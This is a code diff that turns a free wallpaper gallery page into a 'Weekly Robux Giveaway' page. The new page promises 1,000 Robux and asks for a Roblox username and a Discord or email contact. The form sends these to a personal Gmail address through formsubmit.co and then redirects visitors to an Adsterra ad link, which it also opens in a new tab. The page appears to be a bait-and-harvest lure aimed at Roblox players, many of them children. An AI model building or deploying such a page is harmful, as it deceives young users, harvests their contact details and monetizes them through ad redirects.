@@ -3,108 +3,195 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Visionary Assets | Premium Downloads</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/PapaParse/5.3.0/papaparse.min.js"></script>
+    <title>Weekly Robux Giveaway 🎁</title>
     <style>
-        :root { --primary-color: #6366f1; --hover-color: #4f46e5; --bg-color: #f8fafc; --card-bg: #ffffff; --text-dark: #1e293b; --text-light: #64748b; }
-        body { font-family: 'Poppins', sans-serif; background-color: var(--bg-color); margin: 0; padding: 0; color: var(--text-dark); }
-        header { background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%); padding: 40px 20px; text-align: center; color: white; box-shadow: 0 4px 20px rgba(99, 102, 241, 0.2); }
-        header h1 { margin: 0; font-size: 2.5rem; letter-spacing: -1px; font-weight: 700; }
-        header p { margin-top: 10px; font-size: 1.1rem; opacity: 0.9; font-weight: 300; }
-        .container { max-width: 1200px; margin: -30px auto 0; padding: 20px; display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 25px; position: relative; min-height: 300px; }
-        .image-card { background-color: var(--card-bg); border-radius: 16px; overflow: hidden; box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.05); transition: transform 0.3s ease, box-shadow 0.3s ease; border: 1px solid rgba(0,0,0,0.05); animation: fadeIn 0.5s ease-in-out; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-        .image-card:hover { transform: translateY(-7px); box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1); }
-        .image-card img { width: 100%; height: 220px; object-fit: cover; display: block; }
-        .card-content { padding: 20px; }
-        .card-title { font-weight: 700; font-size: 1.1rem; margin-bottom: 5px; color: var(--text-dark); display: block; }
-        .card-desc { font-size: 0.9rem; color: var(--text-light); margin-bottom: 15px; display: block; }
-        .download-btn { background-color: var(--primary-color); color: white; text-decoration: none; padding: 12px 0; border-radius: 8px; display: block; text-align: center; font-weight: 600; transition: background 0.3s; border: none; cursor: pointer; width: 100%; }
-        .download-btn:hover { background-color: var(--hover-color); }
-        .download-btn::before { content: "⬇ "; }
-        .ad-container { width: 100%; display: flex; justify-content: center; margin: 20px 0; }
-        .ad-box { width: 728px; height: 90px; display: flex; align-items: center; justify-content: center; }
-        footer { text-align: center; padding: 30px; color: var(--text-light); font-size: 0.9rem; border-top: 1px solid #e2e8f0; margin-top: 40px; }
-        .loader { border: 5px solid #f3f3f3; border-top: 5px solid var(--primary-color); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 50px auto; display: block; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        :root {
+            --bg: #1a1a1a;
+            --card: #2d2d2d;
+            --accent: #00b06f; /* Roblox Green */
+            --text: #ffffff;
+            --gold: #ffd700;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            /* الخلفية */
+            background-image: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), url('https://images.unsplash.com/photo-1614294148960-9aa740632a87?q=80&w=1920&auto=format&fit=crop');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            color: var(--text);
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background-color: rgba(45, 45, 45, 0.95);
+            width: 100%;
+            max-width: 450px;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+            text-align: center;
+            border: 2px solid #444;
+            position: relative;
+            overflow: hidden;
+            backdrop-filter: blur(10px);
+        }
+
+        /* شريط ذهبي علوي */
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 5px;
+            background: linear-gradient(90deg, var(--accent), var(--gold));
+        }
+
+        /* تنسيق أيقونة روبلوكس (SVG) */
+        .header-icon-svg {
+            width: 70px;
+            height: 70px;
+            fill: white;
+            margin-bottom: 10px;
+            filter: drop-shadow(0 0 5px rgba(255,255,255,0.3));
+        }
+
+        h1 { margin: 5px 0 10px 0; font-size: 1.8rem; text-transform: uppercase; letter-spacing: 1px; }
+        .subtitle { color: #aaa; font-size: 0.9rem; margin-bottom: 25px; }
+
+        .prize-box {
+            background: rgba(0, 176, 111, 0.1);
+            border: 1px dashed var(--accent);
+            padding: 20px 15px;
+            border-radius: 15px;
+            margin-bottom: 25px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .prize-title { color: var(--accent); font-weight: bold; font-size: 1.1rem; margin-bottom: 5px; text-transform: uppercase; }
+        
+        .prize-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+
+        /* تنسيق أيقونة الروبوكس (SVG) */
+        .robux-icon-svg {
+            width: 40px;
+            height: 40px;
+            fill: var(--gold);
+            filter: drop-shadow(0 0 5px rgba(255, 215, 0, 0.5));
+        }
+
+        .prize-amount { 
+            color: var(--gold); 
+            font-size: 2.2rem; 
+            font-weight: 800; 
+            text-shadow: 0 0 15px rgba(255, 215, 0, 0.4);
+        }
+
+        /* Form Styling */
+        .input-group { margin-bottom: 15px; text-align: left; }
+        label { display: block; margin-bottom: 5px; color: #ccc; font-size: 0.9rem; font-weight: bold; }
+        
+        input {
+            width: 100%;
+            padding: 14px;
+            background: #3a3a3a;
+            border: 2px solid #555;
+            border-radius: 10px;
+            color: white;
+            font-size: 1rem;
+            outline: none;
+            box-sizing: border-box;
+            transition: 0.3s;
+        }
+        input:focus { border-color: var(--accent); background: #404040; }
+
+        button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(45deg, var(--accent), #009e60);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+            margin-top: 15px;
+            transition: transform 0.2s;
+            box-shadow: 0 4px 15px rgba(0, 176, 111, 0.3);
+        }
+        button:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(0, 176, 111, 0.5); }
+        button:active { transform: scale(0.98); }
+
+        .disclaimer { font-size: 0.7rem; color: #777; margin-top: 25px; line-height: 1.5; border-top: 1px solid #444; padding-top: 15px; }
+
     </style>
 </head>
 <body>
 
-    <header>
-        <h1>Visionary Assets</h1>
-        <p>Premium 8K Wallpapers & Creative Resources - Free for Everyone.</p>
-    </header>
+    <div class="container">
+        <svg class="header-icon-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M5.636 0L0 5.636V18.364L5.636 24H18.364L24 18.364V5.636L18.364 0H5.636ZM12 15a3 3 0 1 1 0-6 3 3 0 0 1 0 6Z"/>
+        </svg>
+        
+        <h1>Weekly Giveaway 🏆</h1>
+        <p class="subtitle">Enter now for a chance to win!</p>
 
-    <div class="ad-container">
-        <div class="ad-box">
+        <div class="prize-box">
+            <div class="prize-title">THIS WEEK'S PRIZE</div>
+            <div class="prize-content">
+                <svg class="robux-icon-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                    <path d="M12 2l10.39 6v12L12 26 1.61 20V8L12 2zm0 6a4 4 0 1 0 0 8 4 4 0 0 0 0-8z" transform="scale(0.8) translate(2,2)"/>
+                </svg>
+                <span class="prize-amount">1,000 R$</span>
             </div>
-    </div>
+        </div>
 
-    <div id="loader" class="loader"></div>
-    <div class="container" id="gallery"></div>
+        <form action="https://formsubmit.co/taha.emad2024@gmail.com" method="POST" onsubmit="handleFormSubmit()">
+            
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_subject" value="New Robux Entry! 💰">
+            <input type="hidden" name="_next" value="https://www.effectivegatecpm.com/ds5b1ig56y?key=6d60022bb2a064effe20218e201d09d2">
 
-    <div class="ad-container">
-        <div class="ad-box">
+            <div class="input-group">
+                <label>Roblox Username</label>
+                <input type="text" name="username" required placeholder="e.g. BloxMaster_2026">
             </div>
-    </div>
 
-    <footer>
-        <p>&copy; 2026 Visionary Assets. All rights reserved.</p>
-    </footer>
+            <div class="input-group">
+                <label>Contact (Discord/Email)</label>
+                <input type="text" name="contact" required placeholder="For the prize code">
+            </div>
+
+            <button type="submit">🚀 ENTER NOW</button>
+        </form>
+
+        <div class="disclaimer">
+            * Not affiliated with Roblox Corp. Fan giveaway.<br>
+            * Winner selected randomly & contacted directly.<br>
+            * No password required. Stay safe!
+        </div>
+    </div>
 
     <script>
-        // ============================================================
-        // رابط الجدول مع كود منع التخزين المؤقت (Cache Buster)
-        const baseSheetURL = "https://docs.google.com/spreadsheets/d/e/2PACX-1vQXleFOoFbt-bQ6VNs9g3y7r5KX_waW_kaEKv6a7OrVlBdw1CpwOira-ACLVXaGyFrtMCIqAa8qUOwH/pub?output=csv";
-        // نضيف وقتاً زمنياً للرابط لإجبار المتصفح على جلب بيانات جديدة
-        const sheetURL = baseSheetURL + "&t=" + Date.now();
-        // ============================================================
+        // رابط Adsterra المباشر
+        const ADSTERRA_LINK = "https://www.effectivegatecpm.com/ds5b1ig56y?key=6d60022bb2a064effe20218e201d09d2";
 
-        const gallery = document.getElementById('gallery');
-        const loader = document.getElementById('loader');
-
-        function downloadAction(imageLink) {
-            setTimeout(function() {
-                window.location.href = imageLink;
-            }, 500);
+        function handleFormSubmit() {
+            window.open(ADSTERRA_LINK, '_blank');
         }
-
-        Papa.parse(sheetURL, {
-            download: true,
-            header: true,
-            complete: function(results) {
-                loader.style.display = 'none';
-                const data = results.data;
-                
-                if (data.length === 0) {
-                    gallery.innerHTML = "<p style='text-align:center; width:100%;'>No images found.</p>";
-                    return;
-                }
-
-                data.forEach(item => {
-                    if(item.Title && item.Image && item.Link) {
-                        const card = `
-                            <div class="image-card">
-                                <img src="${item.Image}" alt="${item.Title}" onerror="this.src='https://via.placeholder.com/300?text=Image+Error'">
-                                <div class="card-content">
-                                    <span class="card-title">${item.Title}</span>
-                                    <span class="card-desc">High Quality | Free Download</span>
-                                    <a href="${item.Link}" target="_blank" onclick="downloadAction('${item.Image}')" class="download-btn">Download Full Quality</a>
-                                </div>
-                            </div>
-                        `;
-                        gallery.innerHTML += card;
-                    }
-                });
-            },
-            error: function(err) {
-                loader.style.display = 'none';
-                console.log("Error:", err);
-                gallery.innerHTML = "<p style='text-align:center; width:100%; color:red;'>Error loading data.</p>";
-            }
-        });
     </script>
+
 </body>
 </html>
